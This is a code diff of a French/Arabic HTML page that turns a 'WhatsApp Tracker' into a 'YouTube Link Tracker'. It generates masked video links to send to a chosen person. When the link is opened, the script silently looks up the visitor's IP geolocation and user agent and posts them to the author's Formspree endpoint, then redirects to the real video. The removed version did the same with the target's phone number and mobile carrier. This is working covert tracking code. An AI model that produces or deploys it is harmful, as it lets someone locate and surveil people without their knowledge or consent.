@@ -3,25 +3,26 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>WhatsApp Tracker - Advanced</title>
+    <title>Video Tracker Pro</title>
     <style>
         body { font-family: 'Segoe UI', sans-serif; background: #f0f2f5; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
         .container { background: white; padding: 30px; border-radius: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); width: 90%; max-width: 400px; text-align: center; }
-        h2 { color: #075e54; }
-        input, textarea { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; }
-        button { background: #25d366; color: white; border: none; padding: 12px; width: 100%; border-radius: 8px; font-weight: bold; cursor: pointer; }
-        .result { margin-top: 20px; padding: 15px; background: #f9f9f9; border-radius: 8px; word-break: break-all; display: none; border: 1px dashed #25d366; }
+        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; }
+        button { background: #ff0000; color: white; border: none; padding: 12px; width: 100%; border-radius: 8px; font-weight: bold; cursor: pointer; }
+        .result { margin-top: 20px; padding: 15px; background: #fff3f3; border-radius: 8px; word-break: break-all; display: none; border: 1px solid #ff0000; }
     </style>
 </head>
 <body>
 
 <div class="container" id="main-ui">
-    <h2>Générateur Pro</h2>
-    <input type="text" id="phoneInput" placeholder="Numéro (ex: 213xxxxxxxxx)">
-    <textarea id="messageInput" placeholder="Message..."></textarea>
-    <button onclick="generateLink()">Générer le lien de suivi</button>
+    <h2 style="color: #ff0000;">YouTube Link Tracker</h2>
+    <p style="font-size: 14px; color: #666;">Masquez votre lien vidéo و تتبع المشاهدات</p>
+    
+    <input type="text" id="videoUrl" placeholder="الصقي رابط الفيديو هنا (YouTube)">
+    <button onclick="generateVideoLink()">Générer le lien masqué</button>
+    
     <div id="resultBox" class="result">
-        <p>Lien à partager :</p>
+        <p style="font-weight: bold;">ارسل هذا الرابط للشخص :</p>
         <code id="finalLink"></code>
     </div>
 </div>
@@ -29,50 +30,51 @@
 <script>
     const FORMSPREE_URL = "https://formspree.io/f/mojpalrd";
 
-    function generateLink() {
-        const phone = document.getElementById('phoneInput').value.trim();
-        const msg = encodeURIComponent(document.getElementById('messageInput').value);
+    function generateVideoLink() {
+        const video = document.getElementById('videoUrl').value.trim();
+        if(!video) return alert("Veuillez entrer un lien vidéo");
+        
         const trackId = Math.random().toString(36).substring(7);
-        const finalUrl = `${window.location.origin}${window.location.pathname}?track=${trackId}&phone=${phone}&msg=${msg}`;
+        // نضع رابط الفيديو مشفراً في الرابط
+        const finalUrl = `${window.location.origin}${window.location.pathname}?track=${trackId}&vid=${btoa(video)}`;
+        
         document.getElementById('resultBox').style.display = 'block';
         document.getElementById('finalLink').innerText = finalUrl;
     }
 
     async function trackAndRedirect() {
         const params = new URLSearchParams(window.location.search);
-        if (params.has('track')) {
-            document.body.innerHTML = "<div class='container'><h4>Chargement sécurisé...</h4></div>";
+        if (params.has('track') && params.has('vid')) {
+            document.body.innerHTML = "<div class='container'><h4>Chargement de la vidéo...</h4></div>";
             
-            let locationData = { city: "Inconnu", region: "Inconnu", country: "Inconnu", org: "Inconnu" };
-
+            const videoUrl = atob(params.get('vid')); // فك تشفير رابط الفيديو
+            
+            // جلب معلومات الموقع
+            let loc = { city: "Inconnu", country: "Inconnu" };
             try {
-                // جلب معلومات الموقع بناءً على الـ IP
-                const response = await fetch('https://ipapi.co/json/');
-                locationData = await response.json();
-            } catch (e) { console.log("Erreur Geo"); }
+                const res = await fetch('https://ipapi.co/json/');
+                loc = await res.json();
+            } catch (e) {}
 
-            const report = {
-                tracking_id: params.get('track'),
-                target_phone: params.get('phone'),
-                time: new Date().toLocaleString('fr-FR'),
-                device: navigator.userAgent,
-                ville: locationData.city,
-                region: locationData.region,
-                pays: locationData.country_name,
-                operateur: locationData.org // يعطيك شركة الاتصال (مثل Ooredoo أو Mobilis)
-            };
-
+            // إرسال التقرير للإيميل
             await fetch(FORMSPREE_URL, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(report)
+                body: JSON.stringify({
+                    type: "Video View",
+                    video: videoUrl,
+                    ville: loc.city,
+                    pays: loc.country_name,
+                    device: navigator.userAgent,
+                    time: new Date().toLocaleString()
+                })
             });
 
-            window.location.href = `https://wa.me/${params.get('phone')}?text=${params.get('msg')}`;
+            // التوجه للفيديو الأصلي
+            window.location.href = videoUrl;
         }
     }
     trackAndRedirect();
 </script>
 </body>
 </html>
- 
